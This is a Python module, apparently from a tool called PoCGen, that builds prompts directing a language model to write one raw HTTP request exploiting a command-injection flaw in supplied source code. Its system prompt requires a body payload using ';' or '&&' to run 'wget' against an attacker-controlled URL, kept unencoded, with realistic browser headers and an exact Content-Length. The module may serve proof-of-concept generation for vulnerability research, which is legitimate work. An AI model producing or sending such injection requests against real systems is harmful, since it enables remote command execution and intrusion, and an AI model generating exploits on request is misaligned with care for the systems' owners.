from __future__ import annotations

from typing import List

from PoCGen.llm.client import ChatMessage


def _build_system_prompt(attacker_url: str) -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a command injection "
        "vulnerability. "
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP "
        "request that could exploit the issue. "
        f"Objective: use a command-injection payload that fetches 'testpoc' from the attacker host "
        f"'{attacker_url}' via wget. The attacker URL represents the file retrieval location; infer the "
        "vulnerable parameter and request structure from the provided code and description.\n"
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no "
        "code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Prefer POST with 'application/x-www-form-urlencoded; charset=UTF-8' unless the code clearly "
        "requires GET/other.\n"
        "- Include realistic headers similar to: User-Agent, Accept, Accept-Language, Accept-Encoding, "
        "Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is "
        "provided, use its host:port, and mirror it in Origin/Referer.\n"
        f"- Body should contain a minimal injection payload using separators like ';' or '&&' to trigger "
        f"command execution, referencing a plausible vulnerable parameter. The payload's purpose is to run "
        f"'wget {attacker_url}'.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing "
        "the exact body content (including any trailing newline if present). Do not guess.\n"
        f"- IMPORTANT: The attacker URL in the body MUST be plaintext (NOT percent-encoded). Do NOT "
        f"URL-encode the '{attacker_url}' or the separators ';'/'&&'. If credentials/cookies are needed, "
        f"include a realistic placeholder cookie, e.g., 'Cookie: Authorization=REPLACE_ME'.\n"
        "- Aim to produce a single, self-contained request in this format (fields may vary as needed):\n"
        "  POST /path/to/vuln HTTP/1.1\n"
        "  Host: <HOST>\n"
        "  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "  Accept: application/json, text/javascript, */*; q=0.01\n"
        "  Accept-Language: en-US,en;q=0.5\n"
        "  Accept-Encoding: gzip, deflate, br\n"
        "  Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "  X-Requested-With: XMLHttpRequest\n"
        "  Content-Length: <LEN>\n"
        "  Origin: http://<HOST>\n"
        "  Connection: keep-alive\n"
        "  Referer: http://<HOST>/\n"
        "  Cookie: <COOKIE_IF_NEEDED>\n"
        "  \n"
        "  <BODY_WITH_INJECTION>\n"
    )


def build_prompt_command_injection_http(*, description: str, code_files: List[str], target: str | None, attacker_url: str) -> List[ChatMessage]:
    user_parts: List[str] = []
    user_parts.append("Vulnerability Description:\n" + description.strip())
    if target:
        user_parts.append(f"Target Hint: {target}")
    for idx, content in enumerate(code_files, start=1):
        user_parts.append(f"--- Code File #{idx} ---\n{content}")

    user = "\n\n".join(user_parts)
    return [
        ChatMessage(role="system", content=_build_system_prompt(attacker_url)),
        ChatMessage(role="user", content=user),
    ]


__all__ = ["build_prompt_command_injection_http"]
